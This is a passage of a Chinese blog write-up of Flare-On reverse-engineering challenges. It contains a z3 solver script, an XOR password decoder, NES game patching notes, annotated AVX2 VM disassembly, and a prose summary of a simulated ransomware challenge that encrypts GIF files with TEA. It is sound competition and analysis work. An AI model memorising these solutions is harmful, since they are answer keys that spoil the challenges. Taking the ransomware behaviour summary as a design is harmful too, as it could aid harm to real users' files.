class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">xor = [<span class="number">212</span>, <span class="number">162</span>, <span class="number">242</span>, <span class="number">218</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">249</span>, <span class="number">83</span>, <span class="number">55</span>, <span class="number">187</span>, <span class="number">131</span>, <span class="number">206</span>]</span><br><span class="line"></span><br><span class="line">b =  [<span class="number">0xa7</span>,<span class="number">0xbf</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x0f</span>,<span class="number">0x01</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x68</span>,<span class="number">0x37</span>,<span class="number">0xb7</span>,<span class="number">0x60</span>,<span class="number">0x7c</span>,<span class="number">0xba</span>,<span class="number">0xb4</span>,<span class="number">0xa8</span>]</span><br><span class="line"></span><br><span class="line">b = [b[i] ^ xor[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=[BitVec(<span class="string">&#x27;x[%d]&#x27;</span> % i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b))]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(b[<span class="number">0</span>] == x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">1</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">2</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">3</span>] == x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">4</span>] == x[<span class="number">1</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">5</span>] == x[<span class="number">0</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">6</span>] == x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">7</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">8</span>] == x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>])</span><br><span class="line">s.add(b[<span class="number">9</span>] == x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">10</span>] == x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">11</span>] == x[<span class="number">0</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">13</span>])</span><br><span class="line">s.add(b[<span class="number">12</span>] == x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">13</span>] == x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">14</span>] == x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">15</span>] == x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(x[<span class="number">11</span>] &gt; <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">answer=s.model()</span><br><span class="line">print(answer)</span><br><span class="line"></span><br><span class="line"><span class="comment"># import string</span></span><br><span class="line"><span class="comment"># table = string.printable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求解 lauchcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">[<span class="number">53</span>, <span class="number">67</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">55</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">50</span>, <span class="number">89</span>, <span class="number">88</span>, <span class="number">77</span>, <span class="number">66</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line"><span class="meta">... </span>    s += chr(i)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">&#x27;5C0G7TY2LWI2YXMB&#x27;</span></span><br></pre></td></tr></table></figure><p>最后把lauchcode喂给程序即可</p><h2 id="8-snake"><a href="#8-snake" class="headerlink" title="8 - snake"></a>8 - snake</h2><p>一个NES题目，通过选择process为6502进行反汇编</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823183745.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823183745.png"></a></p><p>发现当分数为0x33，且游戏轮次为 4 的时候 可打印flag</p><p>或者我们直接将此处的 </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184037.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184037.png"></a></p><p>$F0的值修改为 26偏移处的值相等即可，利用 ** fceux** 进行调试</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184150.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184150.png"></a></p><h2 id="9-reloadered"><a href="#9-reloadered" class="headerlink" title="9 - reloadered"></a>9 - reloadered</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xb</span>)]</span><br><span class="line">b = [<span class="number">0x7A</span>,<span class="number">0x17</span>,<span class="number">0x08</span>,<span class="number">0x34</span>,<span class="number">0x17</span>,<span class="number">0x31</span>,<span class="number">0x3B</span>,<span class="number">0x25</span>,<span class="number">0x5B</span>,<span class="number">0x18</span>,<span class="number">0x2E</span>,<span class="number">0x3A</span>,<span class="number">0x15</span>,<span class="number">0x56</span>,<span class="number">0x0E</span>,<span class="number">0x11</span>,<span class="number">0x3E</span>,<span class="number">0x0D</span>,<span class="number">0x11</span>,<span class="number">0x3B</span>,<span class="number">0x24</span>,<span class="number">0x21</span>,<span class="number">0x31</span>,<span class="number">0x06</span>,<span class="number">0x3C</span>,<span class="number">0x26</span>,<span class="number">0x7C</span>,<span class="number">0x3C</span>,<span class="number">0x0D</span>,<span class="number">0x24</span>,<span class="number">0x16</span>,<span class="number">0x3A</span>,<span class="number">0x14</span>,<span class="number">0x79</span>,<span class="number">0x01</span>,<span class="number">0x3A</span>,<span class="number">0x18</span>,<span class="number">0x5A</span>,<span class="number">0x58</span>,<span class="number">0x73</span>,<span class="number">0x2E</span>,<span class="number">0x09</span>,<span class="number">0x00</span>,<span class="number">0x16</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x22</span>,<span class="number">0x01</span>,<span class="number">0x40</span>,<span class="number">0x08</span>,<span class="number">0x0A</span>,<span class="number">0x14</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;@flare-on.com&quot;</span></span><br><span class="line">print(len(c))</span><br><span class="line">print(len(b))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">        r.append(chr(b[<span class="number">40</span>-j+i]^ord(c[i])))</span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;3HeadedMonkey&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">        r.append(chr(b[i]^ord(passwd[i % len(passwd)])))</span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(r))</span><br></pre></td></tr></table></figure><h2 id="10-Mugatu"><a href="#10-Mugatu" class="headerlink" title="10 -  Mugatu"></a>10 -  Mugatu</h2><p>程序及dll的IAT项交换了。静态看不出到底调用了什么函数，需要还原。</p><p>程序模拟了勒索软件。从twitter的RSS中获取信息来编码目标机的环境信息，然后上传，得到返回的加密密钥。然后从资源中获取dll数据，并加载到内存，枚举盘符，搜索really, really, really, ridiculously good looking gifs文件夹，并加密其下的gif文件。加密算法采用tea。</p><p>解算比较简单。先把另一张图片解密，key在其文件名中已经给出。得到第二第图片的key的第一个字节。题目上中key的长度是4个字节。所以根据gif文件头爆破三个字节的key，然后解密</p><h2 id="11-avx2"><a href="#11-avx2" class="headerlink" title="11 - avx2"></a>11 - avx2</h2><p>考察avx2指令<br>VM代码解析如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line">memset</span><br><span class="line">vmovdqu_mm ptr[0] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[1] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[3] , 0x1A1B1B1B1A13111111111111111111151A1B1B1B1A1311111111111111111115</span><br><span class="line">vmovdqu_mm ptr[4] , 0x1010101010101010080408040201101010101010101010100804080402011010</span><br><span class="line">vmovdqu_mm ptr[5] , 0x0000000000000000B9B9BFBF041310000000000000000000B9B9BFBF04131000</span><br><span class="line">vmovdqu_mm ptr[6] , 0x2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F</span><br><span class="line">vmovdqu_mm ptr[10] , 0x0140014001400140014001400140014001400140014001400140014001400140</span><br><span class="line">vmovdqu_mm ptr[11] , 0x0001100000011000000110000001100000011000000110000001100000011000</span><br><span class="line">vmovdqu_mm ptr[12] , 0xFFFFFFFF0C0D0E08090A040506000102FFFFFFFF0C0D0E08090A040506000102</span><br><span class="line">vmovdqu_mm ptr[13] , 0xFFFFFFFFFFFFFFFF000000060000000500000004000000020000000100000000</span><br><span class="line">vmovdqu_mm ptr[16] , 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">vmovdqu_mm ptr[17] , 0x6A09E667BB67AE853C6EF372A54FF53A510E527F9B05688C1F83D9AB5BE0CD19</span><br><span class="line">vmovdqu_mm ptr[18] , 0x428A2F9871374491B5C0FBCFE9B5DBA53956C25B59F111F1923F82A4AB1C5ED5</span><br><span class="line">vmovdqu_mm ptr[19] , 0x0000000300000002000000010000000000000007000000060000000500000004</span><br><span class="line">vmovdqu_mm ptr[20] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[21] , 0x0000000100000001000000010000000100000001000000010000000100000001</span><br><span class="line">vmovdqu_mm ptr[22] , 0x0000000200000002000000020000000200000002000000020000000200000002</span><br><span class="line">vmovdqu_mm ptr[23] , 0x0000000300000003000000030000000300000003000000030000000300000003</span><br><span class="line">vmovdqu_mm ptr[24] , 0x0000000400000004000000040000000400000004000000040000000400000004</span><br><span class="line">vmovdqu_mm ptr[25] , 0x0000000500000005000000050000000500000005000000050000000500000005</span><br><span class="line">vmovdqu_mm ptr[26] , 0x0000000600000006000000060000000600000006000000060000000600000006</span><br><span class="line">vmovdqu_mm ptr[27] , 0x0000000700000007000000070000000700000007000000070000000700000007</span><br><span class="line">vpermd ptr[20] , ptr[0] , ptr[20]</span><br><span class="line">vpermd ptr[21] , ptr[0] , ptr[21]</span><br><span class="line">vpermd ptr[22] , ptr[0] , ptr[22]</span><br><span class="line">vpermd ptr[23] , ptr[0] , ptr[23]</span><br><span class="line">vpermd ptr[24] , ptr[0] , ptr[24]</span><br><span class="line">vpermd ptr[25] , ptr[0] , ptr[25]</span><br><span class="line">vpermd ptr[26] , ptr[0] , ptr[26]</span><br><span class="line">vpermd ptr[27] , ptr[0] , ptr[27]</span><br><span class="line">vpsrld ptr[7] , ptr[1] , 0x04</span><br><span class="line">vpxor ptr[28] , ptr[20] , ptr[21]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[22]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[23]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[24]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[25]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[26]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[27]</span><br><span class="line"></span><br><span class="line">vpand ptr[7] , ptr[7] , ptr[6]</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07ror 25</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpcmpeqb ptr[8] , ptr[1] , ptr[6]0</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0Bror 11</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11)</span><br><span class="line"></span><br><span class="line">vpcmpeqb ptr[8] , ptr[1] , ptr[6]0</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06ror 6</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[20] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[20] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]~ptr[20]^(ptr[20] &amp; ptr[18] &#x3D;&#x3D; ptr[18]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + (~ptr[20]^(ptr[20] &amp; ptr[18])</span><br><span class="line">vpaddd ptr[20] , ptr[15] , ptr[0](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + (&#96;ptr[20]^(ptr[20] &amp; ptr[18]) + i1</span><br><span class="line">;vpaddb ptr[7] , ptr[8] , ptr[7]add 0</span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[20] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line">vpshufb ptr[7] , ptr[5] , ptr[7]7 &#x3D; i2 &gt;&gt; 4  and 6     5 shuf 7</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddb ptr[2] , ptr[1] , ptr[7]2 &#x3D; 1 + 7   (7 &#x3D; i2 &lt;&lt; 4  and 6       5 shuf 7)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[21] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[21] , ptr[18]~ptr[21]^(ptr[21] &amp; ptr[18])</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[21] , ptr[15] , ptr[0]~ptr[21]^(ptr[21] &amp; ptr[18]) + (17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)  +  i1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[21] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[21]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpmaddubsw ptr[7] , ptr[2] , ptr[10]     2 *+  10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[22] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[22] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]~ptr[22]^(ptr[22] &amp; ptr[18])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[22] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[22] , ptr[28](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[22]^(ptr[22] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line"></span><br><span 